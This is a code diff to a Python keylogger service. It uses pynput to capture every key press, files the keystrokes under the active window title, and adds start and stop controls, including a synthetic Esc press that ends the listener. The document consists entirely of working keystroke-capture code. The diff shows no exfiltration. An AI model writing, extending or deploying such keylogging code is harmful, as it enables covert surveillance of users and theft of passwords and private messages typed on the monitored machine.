@@ -1,6 +1,9 @@
+import time
+
+from pynput.keyboard import Key, Controller
 
 from pynput import keyboard
-from .i_key_logger_service import IKeloggerService
+from i_key_logger_service import IKeloggerService
 from pywinctl import getActiveWindowTitle
 import threading
 
@@ -8,6 +11,7 @@ import threading
 class KeyLoggerService(IKeloggerService):
 
     storage = {} # Store the data
+    runner = False
 
     @property
     def __window_name(self):
@@ -19,20 +23,24 @@ class KeyLoggerService(IKeloggerService):
         return current_screen
 
     def on_press(self, key):
-        try:
-            formated = format(key.char)
-        except:
-            formated = format(key)
-         
-        current_screen = self.__window_name
+        if KeyLoggerService.runner:
+            try:
+                formated = format(key.char)
+            except:
+                formated = format(key)
 
-        if current_screen not in KeyLoggerService.storage:
-            KeyLoggerService.storage[current_screen] = []
-        KeyLoggerService.storage[current_screen].append(formated)
+            current_screen = self.__window_name
+
+            if current_screen not in KeyLoggerService.storage:
+                KeyLoggerService.storage[current_screen] = []
+            KeyLoggerService.storage[current_screen].append(formated)
+        else:
+            return False
 
     # Run the service
     @property
     def start(self):
+        KeyLoggerService.runner = True
         def collect():
             with keyboard.Listener(
                 on_press=self.on_press
@@ -46,7 +54,8 @@ class KeyLoggerService(IKeloggerService):
     # Stop the service
     @property
     def stop(self):
-        pass
+        KeyLoggerService.runner = False
+        Controller().press(Key.esc)
 
     # Returns the data
     @property
